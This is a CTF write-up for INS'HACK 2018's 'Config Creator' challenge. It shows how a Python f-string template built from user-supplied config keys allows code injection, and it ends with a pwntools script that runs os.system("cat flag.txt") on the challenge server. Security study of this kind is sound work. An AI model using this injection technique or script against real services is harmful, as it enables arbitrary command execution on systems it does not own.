# Config Creator
##### INS'HACK 2018 (https://ctf.insecurity-insa.fr)
```
I've just written a small utility to create a config file (which are sooo painful to write by han, right?).

Care to have a look?

nc config-creator.ctf.insecurity-insa.fr 10000
```

This pwn challenge did not provide the binary, so "educated guessing" was used to poke around for possible vulnerabilities. The service presents the following menu:
```
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit
```

`1. Register a new config entry` allows us to create custom key:value pairs. Fuzzing these and then using `4. Show my config` showed errors when the service failed to parse input:

```
config:
f-string: empty expression not allowed (<string>, line 6)
An error occurred, sorry
```

Researching `f-string` revealed that it was likely a new Python format string format (introduced in version 3.6). This fact can be confirmed by registering a valid config entry and then using `3. Show my template`:

```
template:
f"""
configuration [
    a = {a};
]
"""
```

Looks like a Python f-string. So this pwn challenge is about Python injection. According to the docs, `{}` evalues input before supplying it to the f-string. The vulnerability can be confirmed by creating a key `eval('print(1234)')` with `{}` as value:

```
Welcome to the config creator!

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 1

Config key? eval('print(1234)')
Config value? {}

Please choose your action:
  1. Register a new config entry
  2. Change value of an existing config entry
  3. Show my template
  4. Show my config
  5. Reset current config
  6. exit

Choice? 4

config:
1234
eval() arg 1 must be a string, bytes or code object
An error occurred, sorry
```

The program gives an error, but `1234` is printed back, which means injected code executed. Again, according to the docs and as can be confirmed in the challenge, using code with special characters and spaces will not work, because of the way f-strings are parsed. So before evaluating the exploit code, it must first be declared as a value in one key, and then evaluated with the second key. The following exploit does just that:

```python
from pwn import *

def xrust(data):
    global p
    print p.recvuntil('? ')
    p.sendline(data)

p = remote('config-creator.ctf.insecurity-insa.fr', 10000)

xrust('1') #register
xrust('a')
xrust('__import__("os").system("cat flag.txt")')

xrust('1') #register
xrust('eval(a)')
xrust('{}')

xrust('4') #config
print p.recvline() # INSA{dont_get_me_wrong_i_love_python36}
```
